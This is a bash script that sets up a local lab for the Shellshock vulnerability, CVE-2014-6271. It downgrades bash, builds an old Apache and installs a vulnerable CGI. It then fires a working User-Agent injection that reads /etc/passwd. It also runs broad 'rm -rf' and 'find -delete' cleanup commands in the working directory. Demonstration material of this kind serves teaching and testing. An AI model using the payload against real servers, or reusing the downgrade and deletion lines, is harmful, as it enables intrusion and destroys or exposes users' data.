#!/bin/bash
#
# Demonstration of CVE-2014-6271
# Shellshock vulnerability affecting GNU Bash through 4.3
# Requires: php5-cgi (support up till Ubuntu 14.04 LTS)
#           Apache 2.2.22
#
# exit codes:
# 0 - Success
# 1 - Shellshock vulnerability doesn't exist, downgrade bash denied.
# 2 - Shellshock vulnerability exploit failed
# 3 - Bash-4.2 download failed
# 4 - Apache-2.2.22 download failed
# 5 - zlib-1.2.11 download failed
# 6 - php5-cgi install failed

# Install bash-4.2, which is vulnerable
install_vuln_bash() {
    read -p "Downgrade to Bash-4.2? [Y/n]: " -n 1 -r
    echo ""
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        #install bash
        wget http://ftp.gnu.org/gnu/bash/bash-4.2.tar.gz
	    wget_result=$?
	    if [ "$wget_result" -eq "0" ]; then
		    tar xvf bash-4.2.tar.gz
		    sh ./bash-4.2/configure
		    make
		    make install
            rm -rf $(ls -al | grep root | awk '{print $9}')
            find . -not -name "setup.sh" -delete
	    else
	        echo "Download failed!"
	        exit 3
	    fi
    else 
        echo "Downgrade denied. Quitting!"
        exit 1
    fi
}

install_zlib() {
    wget http://www.zlib.net/zlib-1.2.11.tar.gz
    wget_result=$?
    if [ "$wget_result" -eq "0" ]; then
	    tar xvf zlib-1.2.11.tar.gz
	    sh ./zlib-1.2.11/configure --prefix=/usr/local
	    make
	    make install
        rm -rf $(ls -al | grep root | awk '{print $9}')
        find . -not -name "setup.sh" -delete
    else
        echo "Download zlib failed!"
        exit 5
    fi
}

install_apache_2_2_22() {
    install_zlib
    wget https://archive.apache.org/dist/httpd/httpd-2.2.22.tar.gz
    wget_result=$?
    if [ "$wget_result" -eq "0" ]; then
	    tar xvf httpd-2.2.22.tar.gz
	    sh ./httpd-2.2.22/configure --prefix=/usr/sbin/apache2 --enable-mods-shared=all --enable-deflate --enable-proxy --enable-proxy-balancer --enable-proxy-http
	    make
	    make install
        rm -rf $(ls -al | grep root | awk '{print $9}')
        find . -not -name "setup.sh" -delete
        /usr/sbin/apache2/bin/apachectl start
    else
        echo "Download apache failed!"
        exit 4
    fi
}

# Test if shellshock vulnerablity exists
check_ss_vuln_exists() {
    env x='() { :;}; echo vulnerable' bash -c "echo this is a test" > output.tmp
    result=$(cat output.tmp | grep vulnerable | wc -l)
    rm output.tmp
    if [ "$result" -eq "1" ]; then
        echo "Vulnerability exists! Continuing setup..."
    else
        echo "Vulnerability doesn't exist..."
        install_vuln_bash
    fi
}

# Create a vulnerable CGI script
create_vuln_cgi() {
    cgi_file="/usr/sbin/apache2/cgi-bin/vulnerable.cgi"
    echo "#!/bin/bash" > $cgi_file
    echo "echo \"Content-type: text/plain\"" >> $cgi_file
    echo "echo" >> $cgi_file
    echo "echo" >> $cgi_file
    echo "echo \"Hello World!\"" >> $cgi_file
    chmod 755 $cgi_file
}

# Require root
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root"
    exit
fi

echo "Updating packages..."
apt-get update
echo "Installing PHP CGI binaries..."
apt-get install php5-cgi -y
php5_cgi_result=$?
if [ "$php5_cgi_result" -eq "0" ]; then
    echo "Install of php5-cgi successful."
else
    echo "Install of php5-cgi failed. Exiting!"
    exit 6
fi

check_ss_vuln_exists
echo "Installing build-essential..."
apt-get install build-essential -y
echo "Installing Apache..."
install_apache_2_2_22
echo "Enabling mod_actions module..."
a2enmod actions
echo "Restarting Apache..."
/usr/sbin/apache2/bin/apachectl restart
echo "Creating vulnerable.cgi..."
create_vuln_cgi
echo "Performing exploit..."
rm /tmp/vulnerable.cgi
wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -P "/tmp/" "http://$(hostname)/cgi-bin/vulnerable.cgi"
wget_result=$?
if [ "$wget_result" -eq "0" ]; then
    echo "Exploit successful."
    echo "Saved to /tmp/vulnerable.cgi."
else
    echo "Exploit failed"
    exit 2
fi
